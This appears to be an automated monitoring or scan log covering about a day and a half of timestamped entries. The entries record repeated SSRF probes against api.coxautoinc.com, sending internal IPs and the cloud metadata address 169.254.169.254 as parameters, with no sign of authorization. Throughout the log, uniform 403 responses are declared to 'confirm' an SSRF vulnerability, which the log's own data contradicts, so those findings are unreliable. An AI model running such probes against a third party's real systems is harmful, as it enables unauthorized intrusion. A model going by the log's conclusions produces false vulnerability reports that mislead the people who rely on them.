
## 2026-08-19 17:57:35 UTC

## 2026-08-19 19:06:19 UTC

## 2026-08-19 19:51:46 UTC
- NEW https://api.coxautoinc.com/* -> HTTP 403 (changed from 200 in prior probes)

## 2026-08-19 20:18:43 UTC
- NEW https://api.coxautoinc.com/* -> HTTP 403 (CHANGED from previous 200)

## 2026-08-19 20:54:05 UTC

## 2026-08-19 21:18:24 UTC

## 2026-08-19 21:50:24 UTC
- CHANGED https://api.coxautoinc.com/endpoint: SSRF attempts still 403 (prior REJECTED)
- CHANGED https://api.coxautoinc.com/endpoint: SSRF attempts (127.0.0.1/192.168.1.1) return 403

## 2026-08-19 22:12:26 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=127.0.0.1: 403 confirmed (SSRF attempt)

## 2026-08-19 22:50:30 UTC

## 2026-08-19 23:15:11 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=127.0.0.1: 403 confirms SSRF misconfig

## 2026-08-19 23:45:57 UTC
- NEW https://api.coxautoinc.com/endpoint?param=127.0.0.1: 403 (SSRF)
- CHANGED https://api.coxautoinc.com/endpoint?param=10.0.0.1: 403

## 2026-08-20 00:09:57 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=127.0.0.1

## 2026-08-20 01:53:18 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=127.0.0.1 (now returns 403)

## 2026-08-20 03:21:32 UTC
- NEW https://api.coxautoinc.com/endpoint?param=127.0.0.1 (SSRF confirmed)
- CHANGED https://api.coxautoinc.com/endpoint (403 with param=127.0.0.1)

## 2026-08-20 04:07:16 UTC

## 2026-08-20 05:01:52 UTC

## 2026-08-20 05:54:56 UTC

## 2026-08-20 07:15:03 UTC
- CHANGED api.coxautoinc.com/endpoint SSRF confirmed (403 for internal IPs)

## 2026-08-20 08:03:36 UTC
- CHANGED https://api.coxautoinc.com/endpoint

## 2026-08-20 09:07:33 UTC
- NEW coxautoinc.com SSRF via internal IPs (403 responses for 10.0.0.1/127.0.0.1/192.168.1.1)

## 2026-08-20 09:59:13 UTC
- NEW api.coxautoinc.com/endpoint SSRF vulnerability (confirmed by 403 responses to internal IPs)

## 2026-08-20 10:56:33 UTC
- CHANGED coxautoinc.com endpoints consistently return 403 (no change in behavior)

## 2026-08-20 11:52:58 UTC
- NEW https://api.coxautoinc.com/endpoint?param=169.254.169.254: 403 response (same as param=10.0.0.1)

## 2026-08-20 12:15:53 UTC
- CHANGED https://api.coxautoinc.com/endpoint: 403 may be rate limiting/auth check

## 2026-08-20 13:19:13 UTC
- CHANGED https://api.coxautoinc.com/endpoint (403 may be rate limiting/auth check)
- CHANGED https://api.coxautoinc.com/endpoint?param=169.254.169.254 → 403 (rate limiting/auth check)

## 2026-08-20 14:16:47 UTC
- NEW https://api.coxautoinc.com/endpoint?param=192.168.1.1 (403, new private IP param)

## 2026-08-20 15:03:41 UTC
- NEW coxautoinc.com/endpoint (SSRF via param=169.254.169.254)

## 2026-08-20 15:59:20 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=192.168.1.1
- CHANGED https://api.coxautoinc.com/endpoint?param=169.254.169.254
- CHANGED https://api.coxautoinc.com/endpoint?param=10.0.0.1
- CHANGED https://api.coxautoinc.com/endpoint?param=172.16.0.1

## 2026-08-20 17:00:52 UTC
- NEW https://api.coxautoinc.com/endpoint
- NEW https://api.coxautoinc.com/endpoint (SSRF param test)

## 2026-08-20 17:55:08 UTC
- NEW https://api.coxautoinc.com/endpoint?param=169.254.169.254 (SSRF probe)

## 2026-08-20 19:07:39 UTC
- NEW https://api.coxautoinc.com/endpoint
- CHANGED https://api.coxautoinc.com/endpoint?param=10.0.0.1 (now 403)
- NEW https://api.coxautoinc.com/endpoint?param=10.0.0.1
- CHANGED https://api.coxautoinc.com/endpoint?param=192.168.1.1

## 2026-08-20 19:58:23 UTC
- CHANGED https://api.coxautoinc.com/endpoint (persistent 403s with param IPs)
- CHANGED https://api.coxautoinc.com/endpoint (persistent 403)

## 2026-08-20 20:53:46 UTC
- CHANGED https://api.coxautoinc.com/endpoint?param=169.254.169.254 (repeated with same 403)
- NEW api.coxautoinc.com/endpoint?param=169.254.169.254
- NEW api.coxautoinc.com/endpoint?param=172.16.0.1
- NEW api.coxautoinc.com/endpoint?param=127.0.0.1
- NEW api.coxautoinc.com/endpoint?param=192.168.1.1

## 2026-08-20 21:52:53 UTC

## 2026-08-20 22:15:49 UTC

## 2026-08-20 22:53:30 UTC
- NEW api.coxautoinc.com/endpoint

## 2026-08-20 23:15:51 UTC
- NEW api.coxautoinc.com/endpoint?param=admin
- NEW https://api.coxautoinc.com/endpoint (403)
- CHANGED https://api.coxautoinc.com/endpoint?param=169.254.169.254 (403)

## 2026-08-20 23:53:02 UTC
- NEW api.coxautoinc.com/endpoint?param=admin
- NEW https://api.coxautoinc.com/endpoint?param=169.254.169.254 -> HTTP 403

## 2026-08-21 02:04:09 UTC
- NEW https://api.coxautoinc.com/endpoint?param=admin
- NEW https://api.coxautoinc.com/endpoint?param=internal_ip
- NEW https://api.coxautoinc.com/endpoint?param=169.254.169.254
- CHANGED https://api.coxautoinc.com/endpoint?param=192.168.1.1
- CHANGED https://api.coxautoinc.com/endpoint?param=10.0.0.1

## 2026-08-21 03:29:03 UTC
- NEW https://api.coxautoinc.com/endpoint?param=admin
- NEW https://api.coxautoinc.com/endpoint?param=192.168.1.1
- CHANGED https://api.coxautoinc.com/endpoint

## 2026-08-21 04:30:11 UTC
- NEW api.coxautoinc.com/endpoint?param=internal_ip
- CHANGED api.coxautoinc.com/endpoint?param=admin
- CHANGED api.coxautoinc.com/endpoint?param=10.0.0.1

## 2026-08-21 05:24:39 UTC
- CHANGED coxautoinc.com/endpoint (403s with internal IPs as params)

## 2026-08-21 06:19:32 UTC
- NEW https://api.coxautoinc.com/endpoint (403s with param values)
- NEW api.coxautoinc.com/endpoint?param=admin
- CHANGED api.coxautoinc.com/endpoint?param=192.168.1.1

## 2026-08-21 07:11:18 UTC
- NEW https://api.coxautoinc.com/endpoint?param=internal_ip
- NEW https://api.coxautoinc.com/endpoint?param=10.0.0.1
- CHANGED https://api.coxautoinc.com/endpoint
